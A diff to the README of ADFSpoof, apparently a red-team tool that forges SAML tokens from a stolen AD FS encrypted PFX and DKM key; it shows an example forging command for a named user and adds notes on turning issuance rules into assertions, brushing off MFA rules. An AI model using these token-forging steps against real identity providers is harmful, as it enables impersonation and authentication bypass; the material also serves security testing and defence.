@@ -129,7 +129,11 @@ Helper command that will take the supplied EncryptedPFX blob and DKM key from `-
 
 `python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s sts.doughcorp.com saml2 --endpoint https://my.app.com/access/saml --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid robin@doughcorp.com --rpidentifier myapp --assertions <Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress"><AttributeValue>robin@doughcorp.com</AttributeValue></Attribute>`
 
+### Reading Issuance Authorization Rules
 
+More coming soon! As a tl;dr for SAML 2.0 each issuance rule (with the exception of the nameid rule) is going to be translated into a SAML assertion. SAML assertions are <Attribute><AttributeValue></AttributeValue><Attribute> tags. The Attribute tag must have an attribute called "Name" that value of which is the claim type. The claim value goes inside the <AttributeValue> tags.
+  
+  There is a little more nuance which I hope to discuss in a wiki page soon, but that is the basic idea. Relying Parties may have "StrongAuth" rules and MFA requirements, but usually we don't care about those.
 
 
 
